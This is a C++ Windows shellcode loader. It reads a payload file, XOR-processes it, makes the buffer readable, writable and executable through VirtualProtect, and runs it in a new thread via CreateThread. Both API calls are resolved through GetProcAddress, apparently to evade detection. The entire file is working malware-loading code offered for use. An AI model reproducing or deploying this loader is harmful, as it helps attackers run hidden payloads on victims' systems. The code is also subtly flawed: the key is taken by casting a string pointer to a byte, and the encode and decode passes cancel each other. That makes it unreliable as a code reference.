#include <iostream>
#include <string>
#include <fstream>
#include <vector>
#include <WinError.h>
#include <Windows.h>

using namespace std;

// XOR the data from a given file.
static void XOREncoding(vector <BYTE>& data, const BYTE key)
{
	for (auto& byte: data)
	{
        byte ^= key;
	}
}

vector<BYTE> ReadBinaryFile(const string& filename) {
    ifstream file(filename,  ios::binary);
    if (!file) {
        const auto& err = errno;

        char error_message[256];  

        strerror_s(error_message, sizeof(error_message), err);

        cerr << "Could not open file: " << filename << ". Error: " << error_message << endl;
        return {};  // Return an empty vector
    }

    // Read file's content
    vector<BYTE> data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();
    return data;
}

static void decodeXOR(LPVOID address, size_t numBytes, uint8_t key) {
    uint8_t* bytePtr = static_cast<uint8_t*>(address); 

    for (size_t i = 0; i < numBytes; ++i) {
        bytePtr[i] ^= key;  // XOR Decode every byte.
    }
}

typedef BOOL (WINAPI* pVirtualProtect)(
    LPVOID lpAdress, 
    SIZE_T dwSize, 
    DWORD flNewProtect, 
    PDWORD lpflOldProtect);

pVirtualProtect VirtualProtectPtr;

typedef HANDLE (WINAPI* pCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T                  dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    __drv_aliasesMem LPVOID lpParameter,
    DWORD                   dwCreationFlags,
    LPDWORD                 lpThreadId);

pCreateThread CreateThreadPtr;

int main(int argc, char* argv[]) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " [key] [file]\n";
        return 1;
    }

    // Get the XOR encription key from command line as well as the filename
    BYTE key = reinterpret_cast<BYTE>(argv[1]);
    string filename = argv[2];

    // Read the file
    vector<BYTE> fileData = ReadBinaryFile(filename);

    if (fileData.empty()) {
        return 2;  
    }

    LPVOID ptr = &fileData[0];
    //printf("%-20s : 0x%-016p\n", "exec_mem addr", (void*)ptr);

    XOREncoding(fileData, key);

    // Set memory to RWX
    DWORD oldProtect = 0;

    VirtualProtectPtr = (pVirtualProtect)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualProtect");

    BOOL exec_mem = VirtualProtectPtr(
        ptr,
        fileData.size(),
        PAGE_EXECUTE_READWRITE,
        &oldProtect);

    decodeXOR(ptr, fileData.size(), key);

    CreateThreadPtr = (pCreateThread)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateThread");

    // Execute it
    DWORD threadId = 0;
    HANDLE hThread = CreateThreadPtr(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)ptr,
        NULL,
        0,
        &threadId);

    // close handle
    CloseHandle(hThread);

    // stop the program from closing
    cout << "Shellcode is running, press key to exit" << endl;
    getchar();

}
